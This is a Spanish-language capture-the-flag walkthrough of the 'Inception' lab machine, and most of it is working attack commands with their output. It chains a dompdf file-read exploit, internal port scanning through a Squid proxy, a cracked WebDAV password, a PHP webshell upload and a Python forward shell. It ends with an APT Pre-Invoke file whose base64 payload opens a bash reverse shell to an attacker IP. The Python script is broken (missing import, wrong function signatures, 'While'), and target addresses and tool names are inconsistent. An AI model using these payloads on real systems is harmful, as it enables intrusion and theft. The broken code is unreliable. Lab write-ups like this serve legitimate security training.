-------
- Tags: #webdav #dompdf #squid-proxy #wfuzz-enumeration #forwad-shell #python-scripting #bash-scripting #cron-job #proxychains  
- --------
## Técnicas utilizadas
- DomPDF Exploitation - Local File Inclusion (LFI) [CVE-2014-2383]  
- Bash Scripting  
- Abusing Squid Proxy  
- Internal Port Discovery via Squid Proxy - Wfuzz  
- Abusing WebDAV - WebShell (Using davtest)  
- Creating a Forward Shell (Python Scripting) - Bypassing Firewall Rules  
- PIVOTING  
- Host Discovery && Port Discovery - Bash Scripting  
- Abusing Cron Job - Apt Pre-Invoke Script (Privilege Escalation)
## Procedimiento

![[Pasted image 20230815223518.png]]

#### Reconocmiento
Si lanzamos un **nmap** a la maquina, vemos los siguientes servicios y sus respectivas versiones:
```ruby
# nmap -sCV -p80,3128 10.10.10.67 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-17 01:27 UTC
Nmap scan report for 10.10.10.67
Host is up (0.054s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.49 seconds
```

Un escaneo web con **Whatweb** nos muestra las siguientes tecnologías web corriendo por detrás:
```ruby
# whatweb $IP
http://10.10.10.67 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.67], Script, Title[Inception]
```

#### DomPDF Exploitation - Local File Inclusion (LFI) [CVE-2014-2383]
Si visitamos la pagina web e inspeccionamos el codigo fuente, podemos ver cientos de numeros, si bajamos del todo vemos un pequeño **hint**. Este nos indica que probemos **dompdf**:
![[Pasted image 20230817013055.png]]

Si googleamos para ver que es, encontramos el siguiente [repositorio](https://github.com/dompdf/dompdf). Basicamente es un convertidor de **HTML** a **PDF**:

	Dompdf is an HTML to PDF converter
	
	At its heart, dompdf is (mostly) a [CSS 2.1](http://www.w3.org/TR/CSS2/) compliant HTML layout and rendering engine written in PHP. It is a style-driven renderer: it will download and read external stylesheets, inline style tags, and the style attributes of individual HTML elements. It also supports most presentational HTML attributes.

Al visitar la ruta de `/dompdf/`  vemos que tenemos capacidad de directory listing. Si buscamos por exploits con **SearchSPloit** encontramos uno de tipo **Arbitrary File Read**:
![[Pasted image 20230817013151.png]]

Nos dice que si atendemos a la ruta `/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/etc/passwd` podemos ver el contenido en **base64**:
```ruby
# curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/etc/passwd" | tail -n 31 | grep -oP '\(.*?\)' | tr -d "()"
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDA6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzdGVtZC1uZXR3b3JrOng6MTAxOjEwMzpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQvbmV0aWY6L2Jpbi9mYWxzZQpzeXN0ZW1kLXJlc29sdmU6eDoxMDI6MTA0OnN5c3RlbWQgUmVzb2x2ZXIsLCw6L3J1bi9zeXN0ZW1kL3Jlc29sdmU6L2Jpbi9mYWxzZQpzeXN0ZW1kLWJ1cy1wcm94eTp4OjEwMzoxMDU6c3lzdGVtZCBCdXMgUHJveHksLCw6L3J1bi9zeXN0ZW1kOi9iaW4vZmFsc2UKc3lzbG9nOng6MTA0OjEwODo6L2hvbWUvc3lzbG9nOi9iaW4vZmFsc2UKX2FwdDp4OjEwNTo2NTUzNDo6L25vbmV4aXN0ZW50Oi9iaW4vZmFsc2UKc3NoZDp4OjEwNjo2NTUzNDo6L3Zhci9ydW4vc3NoZDovdXNyL3NiaW4vbm9sb2dpbgpjb2JiOng6MTAwMDoxMDAwOjovaG9tZS9jb2JiOi9iaW4vYmFzaAo=
```

Podemos hacerle un `base64 -d` y veremos el archivo en texto plano:
```ruby
# curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/etc/passwd" | tail -n 31 | grep -oP '\(.*?\)' | tr -d "()" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

Un dato curioso es que si en el  **wrapper**, en parte del `base64-encode` lo colocamos con un guón bajo `base64_encode` nos decodea el contenido automaticamente:
```ruby
# curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64_encode/resource=/etc/passwd" | tail -n 50 | awk '{print $8}' | sed '/^\s*$/d'
[(root:x:0:0:root:/root:/bin/bash
[(bin:x:2:2:bin:/bin:/usr/sbin/nologin
[(games:x:5:60:games:/usr/games:/usr/sbin/nologin
[(lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
[(news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
[(proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
[(backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
[(Manager:/var/list:/usr/sbin/nologin
[(Reporting
[(nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
[(Synchronization,,,:/run/systemd:/bin/false
[(Management,,,:/run/systemd/netif:/bin/false
[(Resolver,,,:/run/systemd/resolve:/bin/false
[(Proxy,,,:/run/systemd:/bin/false
[(_apt:x:105:65534::/nonexistent:/bin/false
[(cobb:x:1000:1000::/home/cobb:/bin/bash)]
```
#### Bash Scripting
Podemos automatizar todo este proceso con un pequeño script en **bash**.

-------------
#### Abusing Squid Proxy
Si listamos el `/proc/net/tcp`  de la maquina, encontramos que el puerto **22** esta abierto, sin embargo, desde fuera no logramos verlo. Viendo que hay un squid proxy, podriamos intentar enumerar puertos internos, dado que si llegamos a pasar por este, tendriamos esa capacidad.

-------------
#### Internal Port Discovery via Squid Proxy - Wfuzz  
Con **Wfuzz** vamos automatizar esta tarea ejecutando el siguiente comando:
```ruby
# wfuzz -c --hc=404,503 -t 100 -z range,1-65535 -p 10.10.10.10:3128:HTTP http://127.0.0.1:FUZZ
```

y vemos los siguientes puertos descubiertos:
![[Pasted image 20230817015852.png]]

Toca jugar con **Proxychains**, vamos a definir la siguiente linea en el archivo `proxychains.conf` el cual recide en el **/etc/**: 
```
http 10.10.10.10 3128
```

Ahora, si hacemos un `proxychains ssh user@localhost` vemos que se intentara conectar al **SSH** de la maquina victima:
```ruby
# proxychains ssh user@localhost
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.67:3128-<><>-127.0.0.1:22-<><>-OK
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:dr5DOURssJH5i8VbjPxvbeM+e2FyMqJ8DGPB/Lcv1Mw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
user@127.0.0.1's password: 
```

------------
#### Abusing WebDAV - WebShell (Using davtest)
Si listamos el **/proc/net/fib_trie** nos encontramos con que estamos en un contenedor, asi que si llegamos a ganar acceso a la maquina, en realidad, sera a contenedor que esta dentro de esta:
```json
Main:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 192.168.0.0/24 2 0 2
        +-- 192.168.0.0/28 2 0 2
           |-- 192.168.0.0
              /32 link BROADCAST
              /24 link UNICAST
           |-- 192.168.0.10
              /32 host LOCAL
        |-- 192.168.0.255
           /32 link BROADCAST
Local:
  +-- 0.0.0.0/0 3 0 5
     |-- 0.0.0.0
        /0 universe UNICAST
     +-- 127.0.0.0/8 2 0 2
        +-- 127.0.0.0/31 1 0 0
           |-- 127.0.0.0
              /32 link BROADCAST
              /8 host LOCAL
           |-- 127.0.0.1
              /32 host LOCAL
        |-- 127.255.255.255
           /32 link BROADCAST
     +-- 192.168.0.0/24 2 0 2
        +-- 192.168.0.0/28 2 0 2
           |-- 192.168.0.0
              /32 link BROADCAST
              /24 link UNICAST
           |-- 192.168.0.10
              /32 host LOCAL
        |-- 192.168.0.255
           /32 link BROADCAST
```

Otro archivo interesante al que podemos atentar es contra el **/etc/squid/squid.conf**, este suele tener configuraciones del proxy que podrian interesarnos:
```ruby
# curl -s -X GET "http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/convert.base64-encode/resource=/etc/squid/squid.conf" | tail -n 31 | grep -oP '\(.*?\)' | tr -d "()" | base64 -d | grep -vE "#" | sed '/^\s*$/d'
acl localnet src 192.168.0.0/16
acl localnet_dst dst 192.168.0.0/16
acl localnet_dst dst 10.0.0.0/8
acl SSL_ports port 443
acl CONNECT method CONNECT
http_access allow localhost manager
http_access deny manager
http_access deny localnet_dst
http_access allow localnet
http_access allow localhost
http_access deny all
http_port 3128
coredump_dir /var/spool/squid
refresh_pattern ^ftp:		1440	20%	10080
refresh_pattern ^gopher:	1440	0%	1440
refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
refresh_pattern (Release|Packages(.gz)*)$      0       20%     2880
refresh_pattern .		0	20%	4320
```

Si listamos el **/etc/apache2/sites-enabled/000-default.conf** podemos ver que hay una ruta nueva que no conociamos: 
`/webdav_test_inception`. Al visitarla en la web, nos pedira que nos atentificación, sin embargo, en el mismo archivo viene la ruta de la **passwd**, el problema es que esta hasheada:
```
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

Podemos intentar rompearla con **John** o **HashCat** y veriamos la contraseña en texto claro:
```
 webdav_tester:babygurl69
```

Con estas credenciales, nos podemos autenticar en el **WebDav**. Lo que podriamos hacer ahora es usar herramientas como **Cadaver** o **DevTest**, estas nos ayudan a probar las diferentes extensiones y ver cuales son validas o no:
```ruby
# devtest -url http://10.10.10.10/webdav_test_inception -auth webdav_test:babygurl69
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.67/webdav_test_inception
********************************************************
NOTE	Random string for this session: uv0syvss_8A
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A
********************************************************
 Sending test files
PUT	jhtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.jhtml
PUT	pl	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.pl
PUT	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.php
PUT	jsp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.jsp
PUT	shtml	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.shtml
PUT	cgi	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.cgi
PUT	asp	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.asp
PUT	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.txt
PUT	aspx	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.aspx
PUT	cfm	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.cfm
PUT	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.html
********************************************************
 Checking for test file execution
EXEC	jhtml	FAIL
EXEC	pl	FAIL
EXEC	php	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.php
EXEC	jsp	FAIL
EXEC	shtml	FAIL
EXEC	cgi	FAIL
EXEC	asp	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.txt
EXEC	aspx	FAIL
EXEC	cfm	FAIL
EXEC	html	SUCCEED:	http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.html

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.jhtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.pl
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.php
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.jsp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.shtml
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.cgi
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.asp
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.txt
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.aspx
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.cfm
PUT File: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.html
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.php
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.txt
Executes: http://10.10.10.67/webdav_test_inception/DavTestDir_uv0syvss_8A/davtest_uv0syvss_8A.html

```

El output nos indica que podemos subir archivos **PHP** y, que ademas. estos se interpretan en la web, asi que podemos proceder a subir una tipica webshell en **PHP**, lo hariamos con el siguiente comando:
```ruby
# curl -s -X PUT http://webdav_tester:babygurl69@10.10.10.10/webdav_test_inception/cmd.php -d @cmd.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/rev.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
```

Y el visitar la pagina e intentar ejecutar comandos,  podemos ver el output:
![[Pasted image 20230817021155.png]]

------------
#### Creating a Forward Shell (Python Scripting) - Bypassing Firewall Rules
Al intentar entablarnos una **reverse-shell** a través de la **webshell** vemos que no nos es posible, esto puede ocurrir por reglas de firewall que esten implementadas en la maquina. Cuando esto ocurra, podemos intentar crear una **Forward Shell**, que tira inicialmente de **Mkfifo**. Se puede crear tanto en **Bash** como en **Python**, esta vez se hara en **Python**:
```python
import requests
import sys
import signal
import pdb
from base64 import b64encode

#ctrl + c
def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# variables globales
main_url = "http://webdav_tester:babygurl69@10.10.10.10/webdav_test_inception/cmd.php"
global stdin, stdout
session = randrange(1, 9999)
stdin = "/dev/shm/stdin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

# funciones
def RunCmd():

	command = b64encode(command.encode()).decode()
	post_data = {
		"cmd" : 'echo "%s" | base64 -d | bash' % command
	}
	r = requests.post(main_url, data=post_data, timeout=2)
	
	return r.text
	
def WriteCmd(command):

	command = b64encode(command.encode()).decode()
	post_data = {
		"cmd" : 'echo "%s" | base64 -d > %s' % (command, stdin)
	}
	r = requests.post(main_url, data=post_data, timeout=2)
	
	return r.text

def ReadCmd():

	ReadTheOutput = """/bin/cat %s""" % stdout
	response = RunCmd(ReadTheOutput)
	return response

def SetupShell():

	NamedPipe = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)

	try: 
		RunCmd(NamedPipe)
	except: 
		None
	return None
	
SetupShell()
	
if __name__ == "__main__":
	
	While True:
		command = input("> ")
		WriteCmd(command + "\n")
		response = ReadCmd()
		print(response)

		ClearTheOutput = """echo '' > %s""" % stdout
		RunCmd(ClearTheOutput)
```

------------
#### PIVOTING
Dentro de las carpetas del **/var/www/** vemos que hay una de un wordpress que de antes no habiamos podido ver. Si listamos el contenido del **wp-config.php** podemos ver unas credenciales:
```php
/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
```
Con estas, podemos migrar al usuario **Cobb** que es un usuario existente a nivel de sistema.

-----------
#### Host Discovery && Port Discovery - Bash Scripting 
Como el usuario **Cobb** tenemos un privilegio asignado a nivel de **Sudoers** que nos permite ejecutar como cualquier usuario, cualquier comando. Asi que, si hacemos un `sudo su` migraremos a **Root**. Al intentar leer la flag, vemos el siguiente mensaje:
```python
# cat /root/root.txt 
You are waiting for a train. A train that will take you far away. Wake up to find root.txt.
```

Dado que tenemos credenciales para el usuario **Cobb**, podriamos intentar conectarnos por **SSH** utilizando el **Squid Proxy**, esto, simplemente para manejar con mayor comodidad. Al hacer un `ipconfig` podemos ver la interfaz que tenemos asignada, si atendemos a la `192.168.0.1` seguramente sea la maquina real.

Podemos scriptear algo en **bash** para descubrir los puertos abiertos en la maquina, además podemos combinar esto con el descubrimiento de hosts

#### Abusing Cron Job - Apt Pre-Invoke Script (Privilege Escalation)
Descubrirmos que el puerto **21** que corresponde a **FTP** esta abierto, podemos conectarnos como **Anonymous** y, al listar los archivos, vemos que estamos en la raiz del sistema de la maquina verdadera.
Si descargamos el **crontab** de la maquina, vemos la siguiente tarea **cron** definida:
```ruby
# cat crontab 

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
```

Basicamente, se esta aplicando un **Apt update** cada cierto tiempo. En dado caso de tener capacidad de escritura en la ruta **/etc/apt/apt.conf.d/** podriamos subir un archivo con un estructura previamente predefinida que nos dejaria ejecutar comandos, tal y como lo vimos en la maquina [[Most Important - Writer|Writer]]. Al intentar crear un archivo, vemos que no contamos con capacidad de escritura:
```
ftp> put test.txt 
local: test.txt remote: test.txt
200 PORT command successful. Consider using PASV.
550 Permission denied.
```

Sin embargo, podemos intentarlo con **tftp**, y por aqui, si que tenemos esa capacidad de escritura. El archivo, tendra que contener lo siguiente:
```
APT::Update::Pre-Invoke {"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMQo= | base64 -d | bash";};
```

Y simplemente subimos el archivo a la ruta:
```
tfpt > put 000malicious /etc/apt/apt.conf.d/000malicious
```

Nos ponemos en escucha y nos caeria la **RevShell**:
```
# whoami
root
```

